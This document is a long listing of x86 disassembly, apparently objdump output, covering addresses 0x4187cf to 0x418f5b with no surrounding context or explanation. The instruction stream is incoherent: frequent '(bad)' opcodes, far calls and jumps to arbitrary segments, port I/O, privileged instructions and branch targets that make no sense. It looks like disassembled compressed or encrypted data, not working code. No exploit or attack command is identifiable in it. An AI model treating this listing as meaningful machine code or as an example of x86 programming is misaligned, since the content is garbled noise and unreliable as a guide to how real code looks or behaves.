  4187cf:	mov    edi,0xf3fef826
  4187d4:	add    al,0x96
  4187d6:	xchg   ebx,eax
  4187d7:	push   esp
  4187d8:	es jmp 0xdde6db93
  4187de:	retf   0xdbd5
  4187e1:	mov    esp,0x179d0418
  4187e6:	out    0xb,al
  4187e8:	les    edi,FWORD PTR [esi]
  4187ea:	stos   DWORD PTR es:[edi],eax
  4187eb:	idiv   DWORD PTR [ecx+ecx*4]
  4187ee:	test   al,0x1d
  4187f0:	mov    dh,0xbe
  4187f2:	xor    al,0x9
  4187f4:	xchg   esi,eax
  4187f5:	sub    dl,al
  4187f7:	push   ecx
  4187f8:	dec    esi
  4187f9:	dec    esi
  4187fa:	iret   
  4187fb:	xchg   esp,eax
  4187fc:	jo     0x41885b
  4187fe:	lods   eax,DWORD PTR ds:[esi]
  4187ff:	call   0xf6d4:0xc0f29d9f
  418806:	push   ss
  418807:	in     eax,0x9
  418809:	(bad)  
  41880a:	neg    BYTE PTR [esi]
  41880c:	pop    es
  41880d:	jbe    0x4187f7
  41880f:	jge    0x418843
  418811:	adc    ebp,ecx
  418813:	xor    esi,DWORD PTR [esi+0x649518bb]
  418819:	sub    BYTE PTR [ecx-0x69e7f656],bl
  41881f:	xchg   ecx,eax
  418820:	or     BYTE PTR [edi+0x154248e7],bl
  418826:	scas   eax,DWORD PTR es:[edi]
  418827:	pop    esi
  418828:	cmp    eax,0x6b9193af
  41882d:	xor    BYTE PTR [edi-0x31],al
  418830:	leave  
  418831:	pop    edx
  418832:	jl     0x41886b
  418834:	push   ss
  418835:	outs   dx,DWORD PTR ds:[esi]
  418836:	inc    esp
  418837:	add    ebp,esi
  418839:	adc    esp,DWORD PTR [edx]
  41883b:	jmp    0x7c1128da
  418840:	cmp    esp,ebx
  418842:	mov    dh,0x8b
  418844:	retf   0x81c5
  418847:	add    BYTE PTR ds:0x1b8d4489,bl
  41884d:	setg   BYTE PTR [si]
  418851:	lods   al,BYTE PTR ds:[esi]
  418852:	jns    0x4187f7
  418854:	mov    esp,0x54916fe6
  418859:	fmulp  st(6),st
  41885b:	mov    al,ds:0x71ff7142
  418860:	hlt    
  418861:	mov    ch,0xc5
  418863:	and    BYTE PTR [ecx+0x507b6110],ch
  418869:	sbb    al,0x30
  41886b:	icebp  
  41886c:	(bad)  
  41886d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41886e:	imul   ebx,ebx,0x23
  418871:	lds    edx,FWORD PTR [edi+esi*2+0x7774c6e4]
  418878:	adc    eax,esp
  41887a:	mov    al,ds:0x9401c30c
  41887f:	int3   
  418880:	mov    esp,0xb277d74b
  418885:	push   es
  418886:	ror    DWORD PTR [eax-0x6435627b],0x2a
  41888d:	mov    al,ds:0xe7dbbb0e
  418892:	std    
  418893:	jnp    0x4188ae
  418895:	scas   eax,DWORD PTR es:[edi]
  418896:	aam    0xe7
  418898:	xchg   esp,eax
  418899:	pop    ebx
  41889a:	bnd jmp 0x9d83ab78
  4188a0:	cmp    eax,0xc6493a7d
  4188a5:	adc    al,0x4b
  4188a7:	jle    0x41889a
  4188a9:	stos   DWORD PTR es:[edi],eax
  4188aa:	cmp    esp,esi
  4188ac:	cld    
  4188ad:	sub    bh,bh
  4188af:	inc    edi
  4188b0:	ja     0x418854
  4188b2:	jge    0x4188f5
  4188b4:	or     edi,ecx
  4188b6:	push   esp
  4188b7:	cdq    
  4188b8:	jge    0x4188eb
  4188ba:	jge    0x4188fa
  4188bc:	cs and al,0xaa
  4188bf:	std    
  4188c0:	dec    edi
  4188c1:	xchg   ebx,eax
  4188c2:	neg    BYTE PTR [ebx]
  4188c4:	pop    eax
  4188c5:	sti    
  4188c6:	cwde   
  4188c7:	das    
  4188c8:	mov    al,0x8e
  4188ca:	mov    bl,0xe6
  4188cc:	xchg   esi,eax
  4188cd:	jns    0x418909
  4188cf:	and    eax,0x7ed61ee3
  4188d4:	rol    edi,0x7e
  4188d7:	outs   dx,DWORD PTR ds:[esi]
  4188d8:	call   0x5e5f:0x1760487a
  4188df:	and    eax,ebx
  4188e1:	or     eax,0x99ba986b
  4188e6:	les    edx,FWORD PTR [ebp+0x0]
  4188e9:	or     ecx,DWORD PTR [ecx+0x597355b1]
  4188ef:	mov    WORD PTR [edx+eax*1+0x3c],?
  4188f3:	sar    BYTE PTR [esi-0x24aca0fa],1
  4188f9:	pop    ebp
  4188fa:	inc    dh
  4188fc:	lods   al,BYTE PTR ds:[esi]
  4188fd:	fbld   TBYTE PTR [edi+0x64]
  418900:	test   BYTE PTR [edx-0x26c60e25],0xa2
  418907:	aad    0x86
  418909:	retf   
  41890a:	mov    eax,ds
  41890c:	in     al,dx
  41890d:	mov    cl,BYTE PTR [eax]
  41890f:	inc    ebp
  418910:	xor    esi,DWORD PTR [esi+0x7f]
  418913:	mov    ebp,0x3e7cadb6
  418918:	dec    ebx
  418919:	cmp    eax,0xc015940c
  41891e:	loope  0x41895e
  418920:	or     BYTE PTR [edx],al
  418922:	and    bl,al
  418924:	retf   0xd70d
  418927:	leave  
  418928:	mov    esp,0xc7128bfb
  41892d:	and    eax,0x7e2d72b8
  418932:	jecxz  0x4189ab
  418934:	out    dx,eax
  418935:	(bad)  
  418936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418937:	(bad)  
  418938:	xchg   edi,eax
  418939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41893a:	mov    eax,0x1b951101
  41893f:	lds    edx,FWORD PTR [edi]
  418941:	out    0x65,al
  418943:	inc    eax
  418944:	mov    ch,0x33
  418946:	push   0x8231fc1c
  41894b:	shl    BYTE PTR [ebx-0x23be1756],0x55
  418952:	test   al,0xe5
  418954:	mov    ecx,0x206dcf63
  418959:	dec    edx
  41895a:	push   cs
  41895b:	inc    edi
  41895c:	(bad)  
  41895d:	mov    eax,ds:0x5f1e6743
  418962:	(bad)  
  418963:	bnd jp 0x418928
  418966:	xor    al,0xe6
  418968:	fiadd  WORD PTR [ecx-0x29]
  41896b:	int3   
  41896c:	int    0x36
  41896e:	pop    ds
  41896f:	jg     0x4189c9
  418971:	es adc eax,0xd3d1d5b0
  418977:	and    ebp,0xcb6e25ef
  41897d:	jbe    0x41898b
  41897f:	inc    esp
  418980:	clc    
  418981:	loopne 0x41891e
  418983:	push   ebp
  418984:	ds jmp 0xaaa2baa1
  41898a:	outs   dx,BYTE PTR ds:[esi]
  41898b:	mov    edi,0x435e6096
  418990:	out    dx,eax
  418991:	push   edi
  418992:	gs dec esp
  418994:	scas   al,BYTE PTR es:[edi]
  418995:	pop    ecx
  418996:	xor    edi,DWORD PTR [ebx+0x70]
  418999:	xchg   esp,eax
  41899a:	repz test BYTE PTR [esi-0x28],bh
  41899e:	mov    esi,0xef69b9b
  4189a3:	mov    ds:0x28efd82b,eax
  4189a8:	mov    ds:0x7d73ebfb,al
  4189ad:	add    edi,DWORD PTR [ebp+0x3f]
  4189b0:	dec    esp
  4189b1:	or     cl,cl
  4189b3:	imul   esi,DWORD PTR [edx+0x2],0xffffff9d
  4189b7:	imul   esi,DWORD PTR [edi-0x7971e30b],0x1f9dc6e1
  4189c1:	push   ebp
  4189c2:	push   ebx
  4189c3:	das    
  4189c4:	(bad)  
  4189c5:	dec    esi
  4189c6:	in     al,0x34
  4189c8:	xor    eax,0xc6fbf038
  4189cd:	imul   ebx
  4189cf:	adc    ebp,DWORD PTR [edx+0x1b]
  4189d2:	cmc    
  4189d3:	pop    edx
  4189d4:	sub    BYTE PTR [di+0x72ec],dl
  4189d9:	leave  
  4189da:	adc    bh,dl
  4189dc:	xor    DWORD PTR [esi-0x30a967d7],edi
  4189e2:	cdq    
  4189e3:	test   eax,0xd8aa5b6a
  4189e8:	inc    edx
  4189e9:	lahf   
  4189ea:	sbb    al,0xbb
  4189ec:	cld    
  4189ed:	lahf   
  4189ee:	aas    
  4189ef:	mov    cl,0x4d
  4189f1:	mov    esi,0xa832a95d
  4189f6:	cmp    edx,esi
  4189f8:	popa   
  4189f9:	cmp    ch,BYTE PTR [ebx+eiz*1]
  4189fc:	lock sti 
  4189fe:	ret    
  4189ff:	into   
  418a00:	inc    DWORD PTR [ebp-0x2e]
  418a03:	dec    esi
  418a04:	sub    eax,0xdea76514
  418a09:	and    DWORD PTR [ebx],0xe729541
  418a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a10:	xchg   ebp,ebp
  418a12:	(bad)  
  418a13:	jno    0x4189df
  418a15:	stc    
  418a16:	shr    DWORD PTR [edi],cl
  418a18:	jle    0x4189bc
  418a1a:	pop    eax
  418a1b:	xchg   esi,eax
  418a1c:	xchg   DWORD PTR [ecx+0x11f9ec1a],ecx
  418a22:	sbb    BYTE PTR [esi],ch
  418a24:	xchg   ebx,eax
  418a25:	pop    esp
  418a26:	pop    edi
  418a27:	dec    esp
  418a28:	jb     0x4189af
  418a2a:	mov    dh,0xc0
  418a2c:	ins    BYTE PTR es:[edi],dx
  418a2d:	out    0x5d,al
  418a2f:	nop
  418a30:	mov    cl,BYTE PTR [ecx-0x7f]
  418a33:	xchg   ebx,eax
  418a34:	jns    0x418a3e
  418a36:	mov    ds:0x92d9f602,eax
  418a3b:	cmp    ecx,ebp
  418a3d:	das    
  418a3e:	dec    edi
  418a3f:	dec    ebp
  418a40:	scas   al,BYTE PTR es:[edi]
  418a41:	pop    ecx
  418a42:	pushf  
  418a43:	adc    DWORD PTR [ebx-0x30],edi
  418a46:	jnp    0x418ac6
  418a48:	mov    ch,ah
  418a4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a4b:	xor    ebx,DWORD PTR [ebx]
  418a4d:	std    
  418a4e:	sahf   
  418a4f:	xor    DWORD PTR [ebx],esi
  418a51:	sbb    eax,0xf6013173
  418a56:	ds dec edx
  418a58:	cmp    al,0x1b
  418a5a:	and    eax,0x847270bd
  418a5f:	sahf   
  418a60:	fisttp DWORD PTR es:[ebx+0x8]
  418a64:	xchg   BYTE PTR [edx+edx*1-0x54],ah
  418a68:	mov    bl,0x44
  418a6a:	sub    ecx,DWORD PTR [edi-0x47b12d1a]
  418a70:	xchg   esp,eax
  418a71:	fdiv   st,st(1)
  418a73:	mov    bh,0xbf
  418a75:	cli    
  418a76:	shl    ch,1
  418a78:	xchg   ebx,eax
  418a79:	mov    ch,0xde
  418a7b:	cs dec esp
  418a7d:	test   al,0x6
  418a7f:	xchg   DWORD PTR [edx-0x7a],esp
  418a82:	outs   dx,DWORD PTR ds:[esi]
  418a83:	add    al,0xea
  418a85:	imul   ecx,DWORD PTR [ecx],0x39
  418a88:	cmp    ebp,eax
  418a8a:	outs   dx,DWORD PTR es:[esi]
  418a8c:	xor    ebx,DWORD PTR [ebp+edx*1-0x2b]
  418a90:	dec    eax
  418a91:	pop    edi
  418a92:	out    dx,al
  418a93:	fs add eax,0xb866263a
  418a99:	ins    BYTE PTR es:[edi],dx
  418a9a:	gs jae 0x418a70
  418a9d:	push   cs
  418a9e:	cmp    edi,DWORD PTR [eax]
  418aa0:	rcr    BYTE PTR [edi],1
  418aa2:	mov    cs,WORD PTR [edx]
  418aa4:	push   es
  418aa5:	stos   BYTE PTR es:[edi],al
  418aa6:	ror    DWORD PTR [esi-0x55],1
  418aa9:	jmp    0xb9c1:0xfd1296d2
  418ab0:	jns    0x418b05
  418ab2:	lds    eax,FWORD PTR [esi]
  418ab4:	int    0xf
  418ab6:	pop    ecx
  418ab7:	sbb    DWORD PTR [ebp+0x4efea5c6],ebp
  418abd:	mov    bl,BYTE PTR [edi]
  418abf:	add    bl,BYTE PTR [eax+0x43]
  418ac2:	push   ebx
  418ac3:	mov    ah,0x3
  418ac5:	mov    ebp,0x2e4881fb
  418aca:	dec    esi
  418acb:	mov    esi,0x78f327b
  418ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ad1:	fild   DWORD PTR [edi-0x63]
  418ad4:	lods   eax,DWORD PTR ds:[esi]
  418ad5:	xchg   BYTE PTR [edx-0x16],dl
  418ad8:	xor    al,0x89
  418ada:	scas   al,BYTE PTR es:[edi]
  418adb:	pop    ebp
  418adc:	outs   dx,BYTE PTR ds:[esi]
  418add:	jb     0x418b44
  418adf:	div    BYTE PTR [eax-0x19545484]
  418ae5:	pusha  
  418ae6:	mov    ebp,0x9441cd55
  418aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aec:	call   0x976d84cb
  418af1:	retf   0xfdf0
  418af4:	adc    ch,dl
  418af6:	cmp    al,0x99
  418af8:	ret    0x6263
  418afb:	cmp    eax,0x3b122611
  418b00:	xchg   edx,eax
  418b01:	je     0x418ad3
  418b03:	jg     0x418ae0
  418b05:	shl    DWORD PTR [ebp+edi*1+0x5b],0x34
  418b0a:	fwait
  418b0b:	(bad)  
  418b0c:	aad    0x48
  418b0e:	stc    
  418b0f:	retf   
  418b10:	inc    ecx
  418b11:	adc    al,0x27
  418b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b14:	adc    DWORD PTR [ebx+0x4a],ecx
  418b17:	xchg   DWORD PTR [esi+0x6b],esp
  418b1a:	add    BYTE PTR [edi-0xd16d613],ch
  418b20:	leave  
  418b21:	fcmovnb st,st(5)
  418b23:	in     al,dx
  418b24:	sub    BYTE PTR [edi-0x83b4e71],0x4f
  418b2b:	pop    esi
  418b2c:	or     DWORD PTR [ebp-0x350ac159],ebp
  418b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b33:	ret    
  418b34:	jmp    0xa80eae27
  418b39:	cli    
  418b3a:	dec    edi
  418b3b:	rcr    BYTE PTR [edx],cl
  418b3d:	icebp  
  418b3e:	xchg   esp,eax
  418b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b40:	je     0x418ba4
  418b42:	sti    
  418b43:	repnz xchg edx,eax
  418b45:	xchg   BYTE PTR [eax+0x20cee06b],dh
  418b4b:	push   edx
  418b4c:	repz in al,dx
  418b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b4f:	ds leave 
  418b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b52:	pushf  
  418b53:	sub    DWORD PTR cs:[esi+0x7f],eax
  418b57:	mov    edi,0x3aa132e2
  418b5c:	xchg   ebx,eax
  418b5d:	mov    esi,0x2803b2bb
  418b62:	fisubr WORD PTR [ecx]
  418b64:	sub    BYTE PTR [ebx-0x9],dh
  418b67:	dec    edi
  418b68:	jo     0x418bd0
  418b6a:	dec    ebx
  418b6b:	js     0x418b57
  418b6d:	int    0x45
  418b6f:	iret   
  418b70:	sub    esp,DWORD PTR [esi+ebx*2]
  418b73:	pop    edx
  418b74:	cld    
  418b75:	push   ebp
  418b76:	mov    fs,WORD PTR [edi+0x6e]
  418b79:	adc    eax,0x5e2ad981
  418b7e:	adc    eax,0xdfbb2516
  418b83:	inc    eax
  418b84:	xchg   ebx,eax
  418b85:	lahf   
  418b86:	pop    esi
  418b87:	stos   BYTE PTR es:[edi],al
  418b88:	(bad)  [edx]
  418b8a:	mov    al,0xd1
  418b8c:	hlt    
  418b8d:	jns    0x418bbe
  418b8f:	ins    BYTE PTR es:[edi],dx
  418b90:	or     al,0x0
  418b92:	js     0x418bbe
  418b94:	ret    0x46c2
  418b97:	fwait
  418b98:	mov    DWORD PTR [ebx],ebx
  418b9a:	jmp    0x418bba
  418b9c:	fild   QWORD PTR [ebx+0x177756c6]
  418ba2:	and    eax,0xa075c40a
  418ba7:	xor    DWORD PTR ds:0xdc1e3a93,edi
  418bad:	fisubr WORD PTR [eax-0xb6292ac]
  418bb3:	jmp    0x4fa:0xe07c37e
  418bba:	xchg   esi,eax
  418bbb:	fwait
  418bbc:	cmp    eax,0xc6056179
  418bc1:	add    edi,edi
  418bc3:	cwde   
  418bc4:	std    
  418bc5:	push   ebp
  418bc6:	push   edi
  418bc7:	sub    bl,bh
  418bc9:	leave  
  418bca:	sbb    ah,dl
  418bcc:	sbb    BYTE PTR [edx+0xb44e9a],al
  418bd2:	cld    
  418bd3:	inc    esp
  418bd4:	dec    eax
  418bd5:	sub    esi,DWORD PTR [eax+0x22]
  418bd8:	(bad)  
  418bd9:	in     al,dx
  418bda:	add    eax,0xbfcdc360
  418bdf:	call   0x108dd06c
  418be4:	aaa    
  418be5:	mov    WORD PTR [eax-0x73368b6e],ds
  418beb:	push   cs
  418bec:	repz push edx
  418bee:	imul   ecx,ecx,0x47
  418bf1:	or     eax,0xe72d2512
  418bf6:	add    al,0x27
  418bf8:	xacquire xchg DWORD PTR [ebp+0x5e6cf5d4],ebx
  418bff:	pop    edi
  418c00:	xchg   ecx,eax
  418c01:	stos   BYTE PTR es:[edi],al
  418c02:	pop    es
  418c03:	(bad)  
  418c05:	xchg   ebx,eax
  418c06:	in     al,0xc0
  418c08:	stc    
  418c09:	(bad)  
  418c0a:	or     eax,0x7eae9669
  418c0f:	sahf   
  418c10:	adc    edi,DWORD PTR [eax-0x74]
  418c13:	pop    ebx
  418c14:	dec    ecx
  418c15:	retf   
  418c16:	into   
  418c17:	fisubr DWORD PTR [ebx]
  418c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c1a:	sbb    al,0xb8
  418c1c:	xchg   esi,eax
  418c1d:	jae    0x418ba4
  418c1f:	mov    bh,0x14
  418c21:	ficomp DWORD PTR ds:0x136238ec
  418c27:	and    eax,0x180b99e8
  418c2c:	cwde   
  418c2d:	fs and eax,0xd3d86072
  418c33:	adc    DWORD PTR [edx+ebx*2+0x67bdaf14],eax
  418c3a:	mov    eax,0xe2fdcd80
  418c3f:	adc    BYTE PTR [ecx],al
  418c41:	sahf   
  418c42:	xor    BYTE PTR [esi+ebx*2-0x7611f793],ch
  418c49:	inc    edi
  418c4a:	shl    eax,cl
  418c4c:	mov    ah,0x99
  418c4e:	adc    ecx,DWORD PTR [eax-0x2c8b2317]
  418c54:	sub    al,0x6b
  418c56:	out    0x2f,al
  418c58:	jnp    0x418c04
  418c5a:	jb     0x418bff
  418c5c:	adc    eax,DWORD PTR [ebp+0x79]
  418c5f:	imul   eax,edx,0x6d
  418c62:	sbb    eax,0xd2a2452e
  418c67:	adc    DWORD PTR [esi-0xe],edx
  418c6a:	dec    esp
  418c6b:	sbb    DWORD PTR [eax+0x31],ebp
  418c6e:	mov    ebp,0x442f6b26
  418c73:	mov    ebp,0xeba82f84
  418c78:	pop    esp
  418c79:	mov    WORD PTR [edi+0x4e],cs
  418c7c:	(bad)  
  418c7d:	dec    esi
  418c7e:	bound  ebx,QWORD PTR [edx+0x65ce25e2]
  418c84:	and    esp,DWORD PTR [ebp-0x4f]
  418c87:	push   0xb6f0c681
  418c8c:	add    eax,0xf062a63c
  418c91:	imul   ebx,DWORD PTR [edi+0x338af7cc],0x7f96f25e
  418c9b:	outs   dx,DWORD PTR ds:[esi]
  418c9c:	lock sbb edi,esi
  418c9f:	adc    cl,ah
  418ca1:	cmp    eax,0xc62772e6
  418ca6:	xor    bh,BYTE PTR [edi+0x685304f8]
  418cac:	les    esi,FWORD PTR ds:0x5f4cf5ca
  418cb2:	dec    esi
  418cb3:	nop
  418cb4:	xchg   edi,eax
  418cb5:	mov    ecx,0xf7d93011
  418cba:	test   eax,0x2dd5349b
  418cbf:	icebp  
  418cc0:	inc    esp
  418cc1:	scas   eax,DWORD PTR es:[edi]
  418cc2:	outs   dx,BYTE PTR ds:[esi]
  418cc3:	outs   dx,BYTE PTR ds:[esi]
  418cc4:	jmp    0xafbf711
  418cc9:	cmp    dl,BYTE PTR [edx+eiz*1+0x29]
  418ccd:	fisubr WORD PTR [eax-0x7e]
  418cd0:	les    ecx,FWORD PTR [edi]
  418cd2:	fdiv   DWORD PTR [edi+0x6f]
  418cd5:	add    BYTE PTR [eax+0x73],bh
  418cd8:	jo     0x418d45
  418cda:	mov    ah,0xbc
  418cdc:	mov    esi,0xd3d3bbc3
  418ce1:	clc    
  418ce2:	cli    
  418ce3:	dec    ecx
  418ce4:	fsubr  DWORD PTR [eax-0x4c6b3a2a]
  418cea:	dec    BYTE PTR [eax+0x58]
  418ced:	jl     0x418d66
  418cef:	push   0xfffffff8
  418cf1:	rcl    DWORD PTR [ecx],cl
  418cf3:	and    eax,ebx
  418cf5:	stos   BYTE PTR es:[edi],al
  418cf6:	test   DWORD PTR [ebp+ebp*8+0x373cd69d],ecx
  418cfd:	push   ss
  418cfe:	push   0xffffffe7
  418d00:	push   0x4b
  418d02:	mov    ecx,0x567371f0
  418d07:	das    
  418d08:	xchg   esi,eax
  418d09:	stc    
  418d0a:	in     eax,dx
  418d0b:	mov    ah,0x39
  418d0d:	sub    al,0x7a
  418d0f:	js     0x418d36
  418d11:	fdivr  QWORD PTR [edx-0x3ba7c7a7]
  418d17:	(bad)  
  418d18:	mov    ds:0x23d197f6,eax
  418d1d:	stc    
  418d1e:	leave  
  418d1f:	mov    eax,ds:0xcd4f982f
  418d24:	int    0xd
  418d26:	and    DWORD PTR [esp+ebp*2-0xd0fd2ad],0xffffff88
  418d2e:	dec    edi
  418d2f:	(bad)  
  418d31:	lock call 0x8264e2d1
  418d37:	cmp    ebp,DWORD PTR [esi+0x7a]
  418d3a:	push   ds
  418d3b:	inc    esp
  418d3c:	jo     0x418cbf
  418d3e:	mov    ebp,0x3e53eb68
  418d43:	pop    esp
  418d44:	neg    DWORD PTR [ecx-0x17050ee]
  418d4a:	bound  esi,QWORD PTR [edx-0x4eaf7c78]
  418d50:	sti    
  418d51:	dec    ebp
  418d52:	sub    al,0xd8
  418d54:	cli    
  418d55:	or     eax,DWORD PTR [edx-0x36]
  418d58:	lods   al,BYTE PTR ss:[esi]
  418d5a:	retf   
  418d5b:	loop   0x418dba
  418d5d:	das    
  418d5e:	xor    ebx,eax
  418d60:	and    eax,0xdbd2dc8d
  418d65:	popa   
  418d66:	xchg   esi,eax
  418d67:	icebp  
  418d68:	push   eax
  418d69:	dec    esi
  418d6a:	push   0xdf9ea798
  418d6f:	jno    0x418dcb
  418d71:	xchg   ebp,eax
  418d72:	inc    edx
  418d73:	push   es
  418d74:	pushw  ds
  418d76:	aas    
  418d77:	loop   0x418d0b
  418d79:	aaa    
  418d7a:	(bad)  
  418d7c:	or     BYTE PTR [edi],ch
  418d7e:	sbb    bl,BYTE PTR [ecx+0x29d63c91]
  418d84:	cwde   
  418d85:	fcomp  QWORD PTR [esi-0x6f080ff4]
  418d8b:	ror    BYTE PTR [eax],1
  418d8d:	adc    DWORD PTR [esi-0x6d],eax
  418d90:	or     BYTE PTR [ebp+0x52594f1],dl
  418d96:	xor    cl,dh
  418d98:	(bad)  
  418d99:	fsub   DWORD PTR [esp+ebp*1+0x41]
  418d9d:	outs   dx,DWORD PTR ds:[esi]
  418d9e:	xlat   BYTE PTR ds:[ebx]
  418d9f:	nop
  418da0:	jns    0x418d96
  418da2:	test   DWORD PTR [ebp-0x7733eaa1],eax
  418da8:	in     eax,0xd0
  418daa:	and    ebx,esi
  418dac:	jb     0x418e13
  418dae:	js     0x418dc9
  418db0:	in     al,dx
  418db1:	inc    edi
  418db2:	and    BYTE PTR [ecx-0x22],cl
  418db5:	arpl   WORD PTR [esi],bp
  418db7:	aam    0xe7
  418db9:	(bad)  
  418dbb:	push   ds
  418dbc:	cmc    
  418dbd:	push   ss
  418dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dbf:	push   edx
  418dc0:	stos   BYTE PTR es:[edi],al
  418dc1:	cmp    ebp,esp
  418dc3:	or     ebp,DWORD PTR [ebx]
  418dc5:	xor    DWORD PTR [eax],edx
  418dc7:	repnz dec ebx
  418dc9:	(bad)  
  418dcb:	cdq    
  418dcc:	das    
  418dcd:	sbb    bh,0x31
  418dd0:	mov    al,ds:0xb559c391
  418dd5:	repnz out dx,al
  418dd7:	test   BYTE PTR [esi+ebx*4],dh
  418dda:	mov    dh,0x1d
  418ddc:	inc    esi
  418ddd:	add    eax,0x4670abee
  418de2:	pop    ss
  418de3:	iret   
  418de4:	mov    ds:0x7f28a983,eax
  418de9:	jmp    0xaaa2f40f
  418dee:	lods   al,BYTE PTR ds:[esi]
  418def:	test   al,0x36
  418df1:	add    eax,0x748e59a8
  418df6:	mov    bh,0x69
  418df8:	fdivr  st,st(0)
  418dfa:	cmc    
  418dfb:	pop    edi
  418dfc:	and    al,ah
  418dfe:	add    DWORD PTR [edi-0x2f],esi
  418e01:	pop    ds
  418e02:	push   ss
  418e03:	pop    es
  418e04:	jae    0x418de6
  418e06:	neg    BYTE PTR [ecx+0x35]
  418e09:	adc    al,0x15
  418e0b:	fcom   DWORD PTR [edi+0x74e7ecfc]
  418e11:	pop    ds
  418e12:	fsubr  st,st(6)
  418e14:	fistp  WORD PTR [esi+ebp*8+0x73]
  418e18:	push   eax
  418e19:	ins    BYTE PTR es:[edi],dx
  418e1a:	imul   BYTE PTR [ebx]
  418e1c:	pop    edx
  418e1d:	repz lock push 0xd
  418e21:	mov    ebx,0xb40a6dff
  418e26:	pop    ebp
  418e27:	shr    ah,cl
  418e29:	inc    edx
  418e2a:	mul    bl
  418e2c:	xchg   DWORD PTR ds:0xd995bd03,esi
  418e32:	enter  0x1a2e,0x18
  418e36:	mov    ecx,0x3973b4a6
  418e3b:	(bad)  
  418e3c:	call   0xe9edb255
  418e41:	ds enter 0x6710,0x39
  418e46:	push   ds
  418e47:	mov    cl,0x82
  418e49:	mov    edi,0x142d8aa1
  418e4e:	jmp    0x37f6:0x842a6ffb
  418e55:	xchg   edi,eax
  418e56:	enter  0xea5b,0x40
  418e5a:	fxam   
  418e5c:	push   esi
  418e5d:	fwait
  418e5e:	div    DWORD PTR [esi+0x6213338c]
  418e64:	shl    BYTE PTR [eax+edi*8-0x5f01a598],0xd8
  418e6c:	scas   eax,DWORD PTR es:[edi]
  418e6d:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  418e6f:	xchg   edi,eax
  418e70:	scas   al,BYTE PTR es:[edi]
  418e71:	xor    bl,BYTE PTR [ebx]
  418e73:	add    DWORD PTR [edi+ecx*1+0x42a823fa],edi
  418e7a:	add    esi,ebp
  418e7c:	lods   al,BYTE PTR ds:[esi]
  418e7d:	jbe    0x418e0a
  418e7f:	test   DWORD PTR [ecx-0x57],edx
  418e82:	lds    ecx,FWORD PTR [esi-0x23]
  418e85:	push   ecx
  418e86:	mov    ch,0x85
  418e88:	push   eax
  418e89:	repz jmp 0x418ed2
  418e8c:	and    esp,DWORD PTR [ecx+0x2d]
  418e8f:	push   edx
  418e90:	jne    0x418e95
  418e92:	sbb    DWORD PTR [eax+eax*2-0x25],esp
  418e96:	xlat   BYTE PTR ds:[ebx]
  418e97:	adc    BYTE PTR [ecx],bl
  418e99:	clc    
  418e9a:	cmp    al,0x25
  418e9c:	inc    eax
  418e9d:	div    BYTE PTR [ecx]
  418e9f:	lock int 0x48
  418ea2:	test   eax,edi
  418ea4:	dec    ebp
  418ea5:	std    
  418ea6:	pop    ebp
  418ea7:	xchg   BYTE PTR [eax],dl
  418ea9:	lea    ecx,[ecx]
  418eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eac:	inc    ecx
  418ead:	aam    0xe3
  418eaf:	or     dh,ch
  418eb1:	push   edi
  418eb2:	js     0x418ef2
  418eb4:	cmp    DWORD PTR [eax-0x30],edx
  418eb7:	cmp    ebp,DWORD PTR [edi+edx*8-0x3f]
  418ebb:	jecxz  0x418ee6
  418ebd:	clc    
  418ebe:	jecxz  0x418eba
  418ec0:	xor    dh,BYTE PTR [esi-0x46336ac5]
  418ec6:	outs   dx,BYTE PTR ds:[esi]
  418ec7:	inc    edi
  418ec8:	xchg   ebp,eax
  418ec9:	scas   al,BYTE PTR es:[edi]
  418eca:	imul   esp,DWORD PTR [ebx],0x2290b525
  418ed0:	push   ecx
  418ed1:	jge    0x418e5c
  418ed3:	pusha  
  418ed4:	jno    0x418ef1
  418ed6:	cs and al,0x51
  418ed9:	call   0x7edb:0xc58e34d0
  418ee0:	push   edi
  418ee1:	jge    0x418ecc
  418ee3:	sub    ebx,0x47
  418ee6:	ss out 0xc5,eax
  418ee9:	push   cs
  418eea:	(bad)  
  418eeb:	mov    ds:0x426f463c,al
  418ef0:	std    
  418ef1:	inc    esp
  418ef2:	xchg   DWORD PTR [ebp-0x6b],esi
  418ef5:	pop    ebp
  418ef6:	scas   eax,DWORD PTR es:[edi]
  418ef7:	or     ah,BYTE PTR [edi+0x6fd21ad9]
  418efd:	and    DWORD PTR [ebx-0x5],0x1c3dffd0
  418f04:	(bad)  
  418f05:	jle    0x418f32
  418f07:	mov    cl,bh
  418f09:	push   edx
  418f0a:	call   FWORD PTR [ecx+0x19832e54]
  418f10:	jnp    0x418ee5
  418f12:	xor    cl,cl
  418f14:	int3   
  418f15:	pop    ebp
  418f16:	sub    cl,BYTE PTR [eax+0x43]
  418f19:	or     eax,ecx
  418f1b:	adc    al,0xff
  418f1d:	sahf   
  418f1e:	push   0x9ebda0ba
  418f23:	cmp    dl,BYTE PTR [eax+0x2e224a89]
  418f29:	jae    0x418edb
  418f2b:	mov    ah,0xb9
  418f2d:	xchg   DWORD PTR [edi-0x16636225],eax
  418f33:	add    eax,0x2cc930aa
  418f38:	sub    BYTE PTR [edx-0xd],ch
  418f3b:	jb     0x418f2f
  418f3d:	outs   dx,DWORD PTR ds:[esi]
  418f3e:	fs sahf 
  418f40:	imul   ebp,DWORD PTR [edi],0x2ed59c35
  418f46:	mov    edx,edi
  418f48:	and    DWORD PTR [ebx-0x6a7308fe],0x3a
  418f4f:	popf   
  418f50:	adc    bl,ah
  418f52:	lock mov BYTE PTR [edx+0x359c53a2],bl
  418f59:	loop   0x418f0a
  418f5b:	xchg   cl,ah
